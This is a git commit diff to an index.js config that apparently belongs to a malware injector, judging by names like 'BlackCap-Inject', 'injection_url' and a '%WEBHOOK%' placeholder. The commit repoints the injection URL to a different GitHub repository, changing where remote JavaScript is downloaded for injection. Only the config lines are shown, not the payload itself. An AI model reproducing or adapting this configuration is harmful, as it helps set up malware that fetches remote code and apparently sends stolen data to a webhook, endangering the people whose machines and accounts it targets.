6aef76560eb99945d80f5dcf1ae81af23a4e486d
Saint <111476645+saintdaddy@users.noreply.github.com>
2022-12-03 16:55:56 +0300

    Update index.js

--- index.js
+++ index.js
@@ -26,7 +26,7 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/saintdaddy/0x44/main/index.js",
     webhook: "%WEBHOOK%",
     filter2: {
         urls: [
